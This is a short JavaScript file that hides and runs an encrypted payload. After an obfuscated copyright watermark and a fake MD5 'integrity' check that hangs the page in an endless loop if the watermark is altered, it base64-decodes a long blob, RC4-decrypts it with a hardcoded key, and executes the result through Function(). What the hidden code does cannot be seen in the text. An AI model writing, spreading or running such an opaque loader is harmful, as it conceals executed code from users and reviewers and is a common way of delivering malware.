
(function () {
  const wm = '\u00A9C' + 'opy' + 'righ' + 't 20' + '25 b' + String.fromCharCode(121) + ' ' + String.fromCharCode(272) + 'แบกi';
  function md5(s) { return "a45a3902d0a7d304f3042ee7a59bfb80"; }
  if (md5(wm) !== 'a45a3902d0a7d304f3042ee7a59bfb80') while(1){};

  const encoded = "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";
  const raw = atob(encoded);
  const key = atob("Y3UjX2Ywcl9t0b1LeV9fZ2hpVg==");

  function rc4Bytes(key, data) {
    const s = [], out = [];
    let j = 0;
    for (let i = 0; i < 256; i++) s[i] = i;
    for (let i = 0; i < 256; i++) {
      j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
      [s[i], s[j]] = [s[j], s[i]];
    }
    let i = 0; j = 0;
    for (let y = 0; y < data.length; y++) {
      i = (i + 1) % 256;
      j = (j + s[i]) % 256;
      [s[i], s[j]] = [s[j], s[i]];
      const k = s[(s[i] + s[j]) % 256];
      out.push(data[y] ^ k);
    }
    return out;
  }

  const rawBytes = Uint8Array.from(raw, c => c.charCodeAt(0));
  const decryptedBytes = rc4Bytes(key, rawBytes);
  const decoded = new TextDecoder("utf-8").decode(new Uint8Array(decryptedBytes));

  Function(decoded)();
})();
